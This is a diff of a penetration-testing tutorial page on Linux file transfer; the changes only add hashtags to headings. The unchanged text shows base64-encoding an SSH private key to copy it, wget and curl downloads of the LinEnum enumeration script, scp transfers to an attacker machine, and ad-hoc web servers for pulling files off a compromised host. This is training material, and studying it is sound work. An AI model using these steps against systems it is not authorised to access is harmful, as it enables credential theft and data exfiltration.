@@ -23,7 +23,7 @@ We have access to the machine `NIX04`, and we need to download a file from our `
 
 Depending on the file size we want to transfer, we can use a method that does not require network communication. If we have access to a terminal, we can encode a file to a base64 string, copy its content into the terminal and perform the reverse operation. Let's see how we can do this with Bash.
 
-#### Pwnbox - Check File MD5 hash
+#### Pwnbox - Check File MD5 hash #md5 
 
 ```shell
 [!bash!]$ md5sum id_rsa 4e301756a07ded0a2dd6953abf015278 id_rsa
@@ -31,7 +31,7 @@ Depending on the file size we want to transfer, we can use a method that does no
 
 We use `cat` to print the file content, and base64 encode the output using a pipe `|`. We used the option `-w 0` to create only one line and ended up with the command with a semi-colon (;) and `echo` keyword to start a new line and make it easier to copy.
 
-#### Pwnbox - Encode SSH Key to Base64
+#### Pwnbox - Encode SSH Key to Base64 #base64 
 
 ```shell
 [!bash!]$ cat id_rsa |base64 -w 0;echo
@@ -65,7 +65,7 @@ Two of the most common utilities in Linux distributions to interact with web app
 
 To download a file using `wget`, we need to specify the URL and the option \`-O' to set the output filename.
 
-#### Download a File Using wget
+#### Download a File Using wget #wget 
 
 ```shell
 [!bash!]$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
@@ -73,7 +73,7 @@ To download a file using `wget`, we need to specify the URL and the option \`-O'
 
 `cURL` is very similar to `wget`, but the output filename option is lowercase \`-o'.
 
-#### Download a File Using cURL
+#### Download a File Using cURL #curl 
 
 ```shell
 [!bash!]$ curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
@@ -131,7 +131,7 @@ There may also be situations where none of the well-known file transfer tools ar
 
 ___
 
-## SSH Downloads
+## SSH Downloads #ssh 
 
 SSH (or Secure Shell) is a protocol that allows secure access to remote computers. SSH implementation comes with an `SCP` utility for remote file transfer that, by default, uses the SSH protocol.
 
@@ -172,7 +172,7 @@ tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      
 
 Now we can begin transferring files. We need to specify the IP address of our Pwnbox and the username and password.
 
-#### Linux - Downloading Files Using SCP
+#### Linux - Downloading Files Using SCP #SCP 
 
 ```shell
 [!bash!]$ scp plaintext@192.168.49.128:/root/myroot.txt .
@@ -246,13 +246,13 @@ We used the option `--insecure` because we used a self-signed certificate that w
 
 ___
 
-## Alternative Web File Transfer Method
+## Alternative Web File Transfer Method #webserver
 
 Since Linux distributions usually have `Python` or `php` installed, starting a web server to transfer files is straightforward. Also, if the server we compromised is a web server, we can move the files we want to transfer to the web server directory and access them from the web page, which means that we are downloading the file from our Pwnbox.
 
 It is possible to stand up a web server using various languages. A compromised Linux machine may not have a web server installed. In such cases, we can use a mini web server. What they perhaps lack in security, they make up for flexibility, as the webroot location and listening ports can quickly be changed.
 
-#### Linux - Creating a Web Server with Python3
+#### Linux - Creating a Web Server with Python3 #python
 
 ```shell
 [!bash!]$ python3 -m http.server
@@ -260,7 +260,7 @@ It is possible to stand up a web server using various languages. A compromised L
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 ```
 
-#### Linux - Creating a Web Server with Python2.7
+#### Linux - Creating a Web Server with Python2.7 #python
 
 ```shell
 [!bash!]$ python2.7 -m SimpleHTTPServer
@@ -268,7 +268,7 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 ```
 
-#### Linux - Creating a Web Server with PHP
+#### Linux - Creating a Web Server with PHP #php 
 
 ```shell
 [!bash!]$ php -S 0.0.0.0:8000
@@ -276,7 +276,7 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 [Fri May 20 08:16:47 2022] PHP 7.4.28 Development Server (http://0.0.0.0:8000) started
 ```
 
-#### Linux - Creating a Web Server with Ruby
+#### Linux - Creating a Web Server with Ruby #Ruby 
 
 ```shell
 [!bash!]$ ruby -run -ehttpd . -p8000
@@ -306,7 +306,7 @@ filetotransfer.txt                       [ <=>                                  
 
 ___
 
-## SCP Upload
+## SCP Upload #SCP
 
 We may find some companies that allow the `SSH protocol` (TCP/22) for outbound connections, and if that's the case, we can use an SSH server with the `scp` utility to upload files. Let's attempt to upload a file to the target machine using the SSH protocol.
 
